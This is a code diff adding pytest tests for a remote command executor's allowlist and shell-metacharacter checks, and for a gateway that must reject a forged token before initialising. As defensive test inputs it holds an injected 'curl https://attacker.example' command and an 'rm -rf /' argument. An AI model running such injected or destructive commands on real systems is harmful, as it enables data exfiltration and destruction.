@@ -122,6 +122,18 @@ def test_render_command_substitutes_one_argv_element():
     assert argv == ("pi", "--run", "do; rm -rf / #")
 
 
+def test_remote_command_template_allowlist_and_shell_metacharacters(monkeypatch):
+    from server.remote_control.executor import CommandRejected, render_command
+
+    assert render_command("codex exec {task}", task="safe task") == ("codex", "exec", "safe task")
+    with pytest.raises(CommandRejected, match="allowlisted"):
+        render_command("arbitrary-binary {task}", task="safe task")
+    with pytest.raises(CommandRejected, match="metacharacters"):
+        render_command("codex exec {task}; curl https://attacker.example", task="safe task")
+    monkeypatch.setenv("VEYA_REMOTE_AGENT_EXECUTABLE_ALLOWLIST", "custom-agent")
+    assert render_command("custom-agent {task}", task="safe task")[0] == "custom-agent"
+
+
 def test_render_command_refuses_newline_and_empty():
     from server.remote_control import executor
 
@@ -463,3 +475,50 @@ def test_notify_done_uses_web_push(monkeypatch):
     payload = captured["payload"]
     assert payload["kind"] == notify.KIND_DONE
     assert payload[notification_center.WEB_PUSH_FLAG] is True
+
+
+@pytest.mark.asyncio
+async def test_jsonrpc_initialize_authenticates_before_adapter_recovery():
+    from veya.remote.auth import RemoteAuthError
+    from veya.remote.mcp_server import RemoteMCPGateway
+
+    class Auth:
+        configured = True
+
+        def verify(self, _authorization):
+            raise RemoteAuthError("invalid token")
+
+    class Adapter:
+        def __init__(self):
+            self.initializations = 0
+
+        async def initialize(self):
+            self.initializations += 1
+
+        def list_tools(self):
+            return []
+
+    class Sessions:
+        max_sessions = None
+
+        def active_count(self):
+            return 0
+
+    class Audit:
+        def __init__(self):
+            self.rows = []
+
+        def record(self, **row):
+            self.rows.append(row)
+
+    adapter = Adapter()
+    audit = Audit()
+    gateway = RemoteMCPGateway(auth=Auth(), sessions=Sessions(), audit=audit, adapter=adapter)
+    result = await gateway.handle_message(
+        {"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {}},
+        authorization="Bearer forged",
+        remote_addr="127.0.0.1",
+    )
+    assert result["error"]["data"]["error_code"] == "AUTH_DENIED"
+    assert adapter.initializations == 0
+    assert any(row.get("status") == "auth_denied" for row in audit.rows)
